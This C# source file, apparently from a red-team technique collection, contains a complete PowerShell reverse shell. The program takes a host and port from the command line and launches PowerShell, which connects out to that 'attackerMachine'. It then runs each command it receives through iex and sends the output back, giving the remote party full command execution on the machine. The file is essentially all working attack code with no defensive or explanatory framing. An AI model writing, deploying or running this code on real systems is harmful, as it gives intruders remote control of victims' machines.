using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;

namespace WINTRE
{
    class Program
    {
        static int PowerShellReverseShell(string host, string port)
        {
            Process Process = new Process();
            Process.StartInfo.FileName = "powershell";
            Process.StartInfo.Arguments = "-command $attackerMachine = New-Object System.Net.Sockets.TCPClient('" + host + "'," + port + ");" +
				                            "$stream = $attackerMachine.GetStream();" +
				                            "[byte[]]$BYTES = 0..65535|%{0};" +

				                            "while(($i = $stream.Read($BYTES, 0, $BYTES.Length)) -ne 0)" +
				                            "{" +
                                            "    $input = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($BYTES,0, $i);" +
                                            "    $standardOutput = (iex $input 2>&1 | Out-String );" +
                                            "    $standardOutput += '> ';" +
                                            "    $sendbyte = ([text.encoding]::ASCII).GetBytes($standardOutput);" +
                                            "    $stream.Write($sendbyte,0,$sendbyte.Length);" +
                                            "    $stream.Flush();" +
                                            "}" +
                                            "$attackerMachine.Close();\"";
            Process.StartInfo.UseShellExecute = false;
            Process.StartInfo.RedirectStandardOutput = true;
            Process.StartInfo.RedirectStandardError = true;
            Process.Start();
            string output = Process.StandardOutput.ReadToEnd();
            Console.WriteLine(output);
            string err = Process.StandardError.ReadToEnd();
            Console.WriteLine(err);
            Process.WaitForExit();
            return 0;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("ERROR, this technique requires arguments.");
            }
            else
            {
                PowerShellReverseShell(args[0], args[1]);
            }

        }
    }
}